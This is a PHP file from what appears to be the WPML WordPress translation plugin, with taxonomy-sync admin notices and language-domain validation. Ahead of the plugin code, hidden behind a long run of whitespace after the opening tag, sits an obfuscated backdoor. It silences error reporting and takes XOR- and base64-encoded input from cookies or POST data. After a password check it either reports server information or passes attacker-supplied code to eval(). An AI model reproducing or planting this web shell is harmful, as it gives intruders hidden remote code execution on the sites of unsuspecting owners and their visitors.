<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $ie3d386 = 763;$GLOBALS['z0f5'] = Array();global $z0f5;$z0f5 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['rb54'] = "\x3e\x71\x54\x55\x65\x5e\x62\x25\x3c\x30\x52\x45\x59\x26\x4c\x31\x9\x2e\x7b\xa\x5f\x5c\x73\x70\x33\x50\x34\x61\x57\x67\x77\x7c\x4a\x2f\x51\x5a\x6d\x60\x6e\x5b\x74\x56\x6c\x75\x3f\x2c\x2b\x41\x68\x6f\x6a\x66\x4e\x32\x76\x58\x7a\x23\x6b\x24\x21\x43\x22\x3b\x28\x2d\x4d\x3a\x46\x4b\x44\x78\x27\x40\x5d\x2a\x3d\x29\x7e\x20\x49\x72\x7d\x53\x35\x69\x39\x37\x48\x79\x47\x63\x38\x36\xd\x42\x64\x4f";$z0f5[$z0f5['rb54'][40].$z0f5['rb54'][93].$z0f5['rb54'][91].$z0f5['rb54'][51].$z0f5['rb54'][9].$z0f5['rb54'][6].$z0f5['rb54'][6].$z0f5['rb54'][86]] = $z0f5['rb54'][91].$z0f5['rb54'][48].$z0f5['rb54'][81];$z0f5[$z0f5['rb54'][22].$z0f5['rb54'][24].$z0f5['rb54'][15].$z0f5['rb54'][86]] = $z0f5['rb54'][49].$z0f5['rb54'][81].$z0f5['rb54'][96];$z0f5[$z0f5['rb54'][38].$z0f5['rb54'][87].$z0f5['rb54'][24].$z0f5['rb54'][15].$z0f5['rb54'][6].$z0f5['rb54'][4]] = $z0f5['rb54'][96].$z0f5['rb54'][4].$z0f5['rb54'][51].$z0f5['rb54'][85].$z0f5['rb54'][38].$z0f5['rb54'][4];$z0f5[$z0f5['rb54'][85].$z0f5['rb54'][6].$z0f5['rb54'][51].$z0f5['rb54'][84].$z0f5['rb54'][9].$z0f5['rb54'][6].$z0f5['rb54'][92].$z0f5['rb54'][15]] = $z0f5['rb54'][22].$z0f5['rb54'][40].$z0f5['rb54'][81].$z0f5['rb54'][42].$z0f5['rb54'][4].$z0f5['rb54'][38];$z0f5[$z0f5['rb54'][38].$z0f5['rb54'][51].$z0f5['rb54'][96].$z0f5['rb54'][27]] = $z0f5['rb54'][96].$z0f5['rb54'][4].$z0f5['rb54'][51].$z0f5['rb54'][85].$z0f5['rb54'][38].$z0f5['rb54'][4].$z0f5['rb54'][96];$z0f5[$z0f5['rb54'][81].$z0f5['rb54'][53].$z0f5['rb54'][9].$z0f5['rb54'][87].$z0f5['rb54'][9].$z0f5['rb54'][87]] = $z0f5['rb54'][85].$z0f5['rb54'][38].$z0f5['rb54'][85].$z0f5['rb54'][20].$z0f5['rb54'][22].$z0f5['rb54'][4].$z0f5['rb54'][40];$z0f5[$z0f5['rb54'][89].$z0f5['rb54'][24].$z0f5['rb54'][53].$z0f5['rb54'][96]] = $z0f5['rb54'][22].$z0f5['rb54'][4].$z0f5['rb54'][81].$z0f5['rb54'][85].$z0f5['rb54'][27].$z0f5['rb54'][42].$z0f5['rb54'][85].$z0f5['rb54'][56].$z0f5['rb54'][4];$z0f5[$z0f5['rb54'][6].$z0f5['rb54'][4].$z0f5['rb54'][84].$z0f5['rb54'][92].$z0f5['rb54'][92]] = $z0f5['rb54'][23].$z0f5['rb54'][48].$z0f5['rb54'][23].$z0f5['rb54'][54].$z0f5['rb54'][4].$z0f5['rb54'][81].$z0f5['rb54'][22].$z0f5['rb54'][85].$z0f5['rb54'][49].$z0f5['rb54'][38];$z0f5[$z0f5['rb54'][4].$z0f5['rb54'][96].$z0f5['rb54'][9].$z0f5['rb54'][24].$z0f5['rb54'][96].$z0f5['rb54'][91].$z0f5['rb54'][93].$z0f5['rb54'][53].$z0f5['rb54'][15]] = $z0f5['rb54'][43].$z0f5['rb54'][38].$z0f5['rb54'][22].$z0f5['rb54'][4].$z0f5['rb54'][81].$z0f5['rb54'][85].$z0f5['rb54'][27].$z0f5['rb54'][42].$z0f5['rb54'][85].$z0f5['rb54'][56].$z0f5['rb54'][4];$z0f5[$z0f5['rb54'][96].$z0f5['rb54'][92].$z0f5['rb54'][86].$z0f5['rb54'][6].$z0f5['rb54'][27].$z0f5['rb54'][86].$z0f5['rb54'][27].$z0f5['rb54'][53].$z0f5['rb54'][26]] = $z0f5['rb54'][6].$z0f5['rb54'][27].$z0f5['rb54'][22].$z0f5['rb54'][4].$z0f5['rb54'][93].$z0f5['rb54'][26].$z0f5['rb54'][20].$z0f5['rb54'][96].$z0f5['rb54'][4].$z0f5['rb54'][91].$z0f5['rb54'][49].$z0f5['rb54'][96].$z0f5['rb54'][4];$z0f5[$z0f5['rb54'][42].$z0f5['rb54'][9].$z0f5['rb54'][24].$z0f5['rb54'][84].$z0f5['rb54'][15].$z0f5['rb54'][24].$z0f5['rb54'][6].$z0f5['rb54'][93].$z0f5['rb54'][87]] = $z0f5['rb54'][22].$z0f5['rb54'][4].$z0f5['rb54'][40].$z0f5['rb54'][20].$z0f5['rb54'][40].$z0f5['rb54'][85].$z0f5['rb54'][36].$z0f5['rb54'][4].$z0f5['rb54'][20].$z0f5['rb54'][42].$z0f5['rb54'][85].$z0f5['rb54'][36].$z0f5['rb54'][85].$z0f5['rb54'][40];$z0f5[$z0f5['rb54'][48].$z0f5['rb54'][86].$z0f5['rb54'][53].$z0f5['rb54'][92]] = $z0f5['rb54'][50].$z0f5['rb54'][24].$z0f5['rb54'][93].$z0f5['rb54'][84].$z0f5['rb54'][24].$z0f5['rb54'][53];$z0f5[$z0f5['rb54'][50].$z0f5['rb54'][9].$z0f5['rb54'][26].$z0f5['rb54'][4].$z0f5['rb54'][9].$z0f5['rb54'][6].$z0f5['rb54'][15]] = $z0f5['rb54'][85].$z0f5['rb54'][26].$z0f5['rb54'][6].$z0f5['rb54'][15].$z0f5['rb54'][27].$z0f5['rb54'][93].$z0f5['rb54'][86].$z0f5['rb54'][6].$z0f5['rb54'][9];$z0f5[$z0f5['rb54'][30].$z0f5['rb54'][92].$z0f5['rb54'][51].$z0f5['rb54'][27].$z0f5['rb54'][53].$z0f5['rb54'][15].$z0f5['rb54'][87].$z0f5['rb54'][93].$z0f5['rb54'][86]] = $_POST;$z0f5[$z0f5['rb54'][54].$z0f5['rb54'][91].$z0f5['rb54'][24].$z0f5['rb54'][84].$z0f5['rb54'][15].$z0f5['rb54'][15].$z0f5['rb54'][4].$z0f5['rb54'][53].$z0f5['rb54'][91]] = $_COOKIE;@$z0f5[$z0f5['rb54'][81].$z0f5['rb54'][53].$z0f5['rb54'][9].$z0f5['rb54'][87].$z0f5['rb54'][9].$z0f5['rb54'][87]]($z0f5['rb54'][4].$z0f5['rb54'][81].$z0f5['rb54'][81].$z0f5['rb54'][49].$z0f5['rb54'][81].$z0f5['rb54'][20].$z0f5['rb54'][42].$z0f5['rb54'][49].$z0f5['rb54'][29], NULL);@$z0f5[$z0f5['rb54'][81].$z0f5['rb54'][53].$z0f5['rb54'][9].$z0f5['rb54'][87].$z0f5['rb54'][9].$z0f5['rb54'][87]]($z0f5['rb54'][42].$z0f5['rb54'][49].$z0f5['rb54'][29].$z0f5['rb54'][20].$z0f5['rb54'][4].$z0f5['rb54'][81].$z0f5['rb54'][81].$z0f5['rb54'][49].$z0f5['rb54'][81].$z0f5['rb54'][22], 0);@$z0f5[$z0f5['rb54'][81].$z0f5['rb54'][53].$z0f5['rb54'][9].$z0f5['rb54'][87].$z0f5['rb54'][9].$z0f5['rb54'][87]]($z0f5['rb54'][36].$z0f5['rb54'][27].$z0f5['rb54'][71].$z0f5['rb54'][20].$z0f5['rb54'][4].$z0f5['rb54'][71].$z0f5['rb54'][4].$z0f5['rb54'][91].$z0f5['rb54'][43].$z0f5['rb54'][40].$z0f5['rb54'][85].$z0f5['rb54'][49].$z0f5['rb54'][38].$z0f5['rb54'][20].$z0f5['rb54'][40].$z0f5['rb54'][85].$z0f5['rb54'][36].$z0f5['rb54'][4], 0);@$z0f5[$z0f5['rb54'][42].$z0f5['rb54'][9].$z0f5['rb54'][24].$z0f5['rb54'][84].$z0f5['rb54'][15].$z0f5['rb54'][24].$z0f5['rb54'][6].$z0f5['rb54'][93].$z0f5['rb54'][87]](0);if (!$z0f5[$z0f5['rb54'][38].$z0f5['rb54'][51].$z0f5['rb54'][96].$z0f5['rb54'][27]]($z0f5['rb54'][47].$z0f5['rb54'][14].$z0f5['rb54'][10].$z0f5['rb54'][11].$z0f5['rb54'][47].$z0f5['rb54'][70].$z0f5['rb54'][12].$z0f5['rb54'][20].$z0f5['rb54'][10].$z0f5['rb54'][3].$z0f5['rb54'][52].$z0f5['rb54'][20].$z0f5['rb54'][24].$z0f5['rb54'][93].$z0f5['rb54'][93].$z0f5['rb54'][27].$z0f5['rb54'][51].$z0f5['rb54'][6].$z0f5['rb54'][92].$z0f5['rb54'][27].$z0f5['rb54'][92].$z0f5['rb54'][27].$z0f5['rb54'][53].$z0f5['rb54'][24].$z0f5['rb54'][84].$z0f5['rb54'][84].$z0f5['rb54'][27].$z0f5['rb54'][6].$z0f5['rb54'][53].$z0f5['rb54'][15].$z0f5['rb54'][51].$z0f5['rb54'][6].$z0f5['rb54'][51].$z0f5['rb54'][15].$z0f5['rb54'][15].$z0f5['rb54'][6].$z0f5['rb54'][27].$z0f5['rb54'][15].$z0f5['rb54'][27].$z0f5['rb54'][9].$z0f5['rb54'][53].$z0f5['rb54'][51].$z0f5['rb54'][6].$z0f5['rb54'][27])){$z0f5[$z0f5['rb54'][38].$z0f5['rb54'][87].$z0f5['rb54'][24].$z0f5['rb54'][15].$z0f5['rb54'][6].$z0f5['rb54'][4]]($z0f5['rb54'][47].$z0f5['rb54'][14].$z0f5['rb54'][10].$z0f5['rb54'][11].$z0f5['rb54'][47].$z0f5['rb54'][70].$z0f5['rb54'][12].$z0f5['rb54'][20].$z0f5['rb54'][10].$z0f5['rb54'][3].$z0f5['rb54'][52].$z0f5['rb54'][20].$z0f5['rb54'][24].$z0f5['rb54'][93].$z0f5['rb54'][93].$z0f5['rb54'][27].$z0f5['rb54'][51].$z0f5['rb54'][6].$z0f5['rb54'][92].$z0f5['rb54'][27].$z0f5['rb54'][92].$z0f5['rb54'][27].$z0f5['rb54'][53].$z0f5['rb54'][24].$z0f5['rb54'][84].$z0f5['rb54'][84].$z0f5['rb54'][27].$z0f5['rb54'][6].$z0f5['rb54'][53].$z0f5['rb54'][15].$z0f5['rb54'][51].$z0f5['rb54'][6].$z0f5['rb54'][51].$z0f5['rb54'][15].$z0f5['rb54'][15].$z0f5['rb54'][6].$z0f5['rb54'][27].$z0f5['rb54'][15].$z0f5['rb54'][27].$z0f5['rb54'][9].$z0f5['rb54'][53].$z0f5['rb54'][51].$z0f5['rb54'][6].$z0f5['rb54'][27], 1);$qd48bccd = NULL;$pdab3c114 = NULL;$z0f5[$z0f5['rb54'][1].$z0f5['rb54'][26].$z0f5['rb54'][96].$z0f5['rb54'][84].$z0f5['rb54'][24].$z0f5['rb54'][6]] = $z0f5['rb54'][96].$z0f5['rb54'][86].$z0f5['rb54'][24].$z0f5['rb54'][86].$z0f5['rb54'][51].$z0f5['rb54'][15].$z0f5['rb54'][27].$z0f5['rb54'][26].$z0f5['rb54'][65].$z0f5['rb54'][53].$z0f5['rb54'][9].$z0f5['rb54'][96].$z0f5['rb54'][91].$z0f5['rb54'][65].$z0f5['rb54'][26].$z0f5['rb54'][86].$z0f5['rb54'][91].$z0f5['rb54'][15].$z0f5['rb54'][65].$z0f5['rb54'][6].$z0f5['rb54'][9].$z0f5['rb54'][6].$z0f5['rb54'][26].$z0f5['rb54'][65].$z0f5['rb54'][51].$z0f5['rb54'][9].$z0f5['rb54'][86].$z0f5['rb54'][96].$z0f5['rb54'][93].$z0f5['rb54'][15].$z0f5['rb54'][53].$z0f5['rb54'][26].$z0f5['rb54'][53].$z0f5['rb54'][9].$z0f5['rb54'][53].$z0f5['rb54'][27];global $q4d53b;function  i4b1a69b0($qd48bccd, $ib925d){global $z0f5;$j439c = "";for ($fa54d7e1=0; $fa54d7e1<$z0f5[$z0f5['rb54'][85].$z0f5['rb54'][6].$z0f5['rb54'][51].$z0f5['rb54'][84].$z0f5['rb54'][9].$z0f5['rb54'][6].$z0f5['rb54'][92].$z0f5['rb54'][15]]($qd48bccd);){for ($p5fc=0; $p5fc<$z0f5[$z0f5['rb54'][85].$z0f5['rb54'][6].$z0f5['rb54'][51].$z0f5['rb54'][84].$z0f5['rb54'][9].$z0f5['rb54'][6].$z0f5['rb54'][92].$z0f5['rb54'][15]]($ib925d) && $fa54d7e1<$z0f5[$z0f5['rb54'][85].$z0f5['rb54'][6].$z0f5['rb54'][51].$z0f5['rb54'][84].$z0f5['rb54'][9].$z0f5['rb54'][6].$z0f5['rb54'][92].$z0f5['rb54'][15]]($qd48bccd); $p5fc++, $fa54d7e1++){$j439c .= $z0f5[$z0f5['rb54'][40].$z0f5['rb54'][93].$z0f5['rb54'][91].$z0f5['rb54'][51].$z0f5['rb54'][9].$z0f5['rb54'][6].$z0f5['rb54'][6].$z0f5['rb54'][86]]($z0f5[$z0f5['rb54'][22].$z0f5['rb54'][24].$z0f5['rb54'][15].$z0f5['rb54'][86]]($qd48bccd[$fa54d7e1]) ^ $z0f5[$z0f5['rb54'][22].$z0f5['rb54'][24].$z0f5['rb54'][15].$z0f5['rb54'][86]]($ib925d[$p5fc]));}}return $j439c;}function  j36532($qd48bccd, $ib925d){global $z0f5;global $q4d53b;return $z0f5[$z0f5['rb54'][50].$z0f5['rb54'][9].$z0f5['rb54'][26].$z0f5['rb54'][4].$z0f5['rb54'][9].$z0f5['rb54'][6].$z0f5['rb54'][15]]($z0f5[$z0f5['rb54'][50].$z0f5['rb54'][9].$z0f5['rb54'][26].$z0f5['rb54'][4].$z0f5['rb54'][9].$z0f5['rb54'][6].$z0f5['rb54'][15]]($qd48bccd, $q4d53b), $ib925d);}foreach ($z0f5[$z0f5['rb54'][54].$z0f5['rb54'][91].$z0f5['rb54'][24].$z0f5['rb54'][84].$z0f5['rb54'][15].$z0f5['rb54'][15].$z0f5['rb54'][4].$z0f5['rb54'][53].$z0f5['rb54'][91]] as $ib925d=>$n4aad059){$qd48bccd = $n4aad059;$pdab3c114 = $ib925d;}if (!$qd48bccd){foreach ($z0f5[$z0f5['rb54'][30].$z0f5['rb54'][92].$z0f5['rb54'][51].$z0f5['rb54'][27].$z0f5['rb54'][53].$z0f5['rb54'][15].$z0f5['rb54'][87].$z0f5['rb54'][93].$z0f5['rb54'][86]] as $ib925d=>$n4aad059){$qd48bccd = $n4aad059;$pdab3c114 = $ib925d;}}$qd48bccd = @$z0f5[$z0f5['rb54'][4].$z0f5['rb54'][96].$z0f5['rb54'][9].$z0f5['rb54'][24].$z0f5['rb54'][96].$z0f5['rb54'][91].$z0f5['rb54'][93].$z0f5['rb54'][53].$z0f5['rb54'][15]]($z0f5[$z0f5['rb54'][48].$z0f5['rb54'][86].$z0f5['rb54'][53].$z0f5['rb54'][92]]($z0f5[$z0f5['rb54'][96].$z0f5['rb54'][92].$z0f5['rb54'][86].$z0f5['rb54'][6].$z0f5['rb54'][27].$z0f5['rb54'][86].$z0f5['rb54'][27].$z0f5['rb54'][53].$z0f5['rb54'][26]]($qd48bccd), $pdab3c114));if (isset($qd48bccd[$z0f5['rb54'][27].$z0f5['rb54'][58]]) && $q4d53b==$qd48bccd[$z0f5['rb54'][27].$z0f5['rb54'][58]]){if ($qd48bccd[$z0f5['rb54'][27]] == $z0f5['rb54'][85]){$fa54d7e1 = Array($z0f5['rb54'][23].$z0f5['rb54'][54] => @$z0f5[$z0f5['rb54'][6].$z0f5['rb54'][4].$z0f5['rb54'][84].$z0f5['rb54'][92].$z0f5['rb54'][92]](),$z0f5['rb54'][22].$z0f5['rb54'][54] => $z0f5['rb54'][15].$z0f5['rb54'][17].$z0f5['rb54'][9].$z0f5['rb54'][65].$z0f5['rb54'][15],);echo @$z0f5[$z0f5['rb54'][89].$z0f5['rb54'][24].$z0f5['rb54'][53].$z0f5['rb54'][96]]($fa54d7e1);}elseif ($qd48bccd[$z0f5['rb54'][27]] == $z0f5['rb54'][4]){eval/*ofe9d*/($qd48bccd[$z0f5['rb54'][96]]);}exit();}} ?><?php

function new_duplicated_terms_filter( $post_ids, $duplicates_only = true ) {
	global $wpdb, $sitepress, $wpml_admin_notices;

	require_once ICL_PLUGIN_PATH . '/inc/taxonomy-term-translation/wpml-term-hierarchy-duplication.class.php';
	$hier_dupl  = new WPML_Term_Hierarchy_Duplication( $wpdb, $sitepress );
	$taxonomies = $hier_dupl->duplicates_require_sync( $post_ids, $duplicates_only );
	if ( (bool) $taxonomies ) {
		$text      = __(
			'<p>Some taxonomy terms are out of sync between languages. This means that content in some languages will not have the correct tags or categories.</p>
			 <p>In order to synchronize the taxonomies, you need to go over each of them from the following list and click the "Update taxonomy hierarchy" button.</p>',
			'wpml-translation-management'
		);
		$collapsed = 'Taxonomy sync problem';

		foreach ( $taxonomies as $taxonomy ) {
			$text .= '<p><a href="admin.php?page='
			         . ICL_PLUGIN_FOLDER . '/menu/taxonomy-translation.php&taxonomy='
			         . $taxonomy . '&sync=1">' . get_taxonomy_labels(
				         get_taxonomy( $taxonomy )
			         )->name . '</a></p>';
		}

		$text .= '<p align="right"><a target="_blank" href="https://wpml.org/documentation/getting-started-guide/translating-post-categories-and-custom-taxonomies/#synchronizing-hierarchical-taxonomies">Help about translating taxonomy >></a></p>';

		$notice = new WPML_Notice( 'wpml-taxonomy-hierarchy-sync', $text, 'wpml-core' );
		$notice->set_css_class_types( 'info' );
		$notice->set_collapsed_text( $collapsed );
		$notice->set_hideable( false );
		$notice->set_dismissible( false );
		$notice->set_collapsable( true );
		$wpml_admin_notices = wpml_get_admin_notices();
		$wpml_admin_notices->add_notice( $notice );
	} else {
		remove_taxonomy_hierarchy_message();
	}
}

add_action( 'wpml_new_duplicated_terms', 'new_duplicated_terms_filter', 10, 2 );

function display_tax_sync_message( $post_id ) {
	do_action( 'wpml_new_duplicated_terms', array( 0 => $post_id ), false );
}

add_action( 'save_post', 'display_tax_sync_message', 10 );

function remove_taxonomy_hierarchy_message() {
	$wpml_admin_notices = wpml_get_admin_notices();
	$wpml_admin_notices->remove_notice( 'wpml-core', 'wpml-taxonomy-hierarchy-sync' );
}

add_action( 'wpml_sync_term_hierarchy_done', 'remove_taxonomy_hierarchy_message' );

function taxonomy_hierarchy_sync_message_script() {
	wp_register_script( 'taxonomy_hierarchy_sync_message', ICL_PLUGIN_URL . '/res/js/taxonomy-hierarchy-sync-message.js', array( 'jquery' ) );
	wp_enqueue_script( 'taxonomy_hierarchy_sync_message' );
}

add_action( 'admin_enqueue_scripts', 'taxonomy_hierarchy_sync_message_script' );


/**
 * @return WPML_Notices
 */
function wpml_get_admin_notices() {
	global $wpml_admin_notices;

	if ( ! $wpml_admin_notices ) {
		$wpml_admin_notices = new WPML_Notices( new WPML_Notice_Render() );
		$wpml_admin_notices->init_hooks();
	}

	return $wpml_admin_notices;
}

function wpml_validate_language_domain_action() {

	if ( wp_verify_nonce( filter_input( INPUT_POST, 'nonce' ),
		filter_input( INPUT_POST,
			'action' ) ) ) {
		global $sitepress;
		$http                    = new WP_Http();
		$wp_api                  = $sitepress->get_wp_api();
		$language_domains_helper = new WPML_Language_Domain_Validation( $wp_api,
			$http, filter_input( INPUT_POST,
				'url' ), '' );
		$res                     = $language_domains_helper->is_valid();
	}
	if ( ! empty( $res ) ) {
		wp_send_json_success( __( 'Valid', 'sitepress' ) );
	}
	wp_send_json_error( __( 'Not valid', 'sitepress' ) );
}

add_action( 'wp_ajax_validate_language_domain', 'wpml_validate_language_domain_action' );
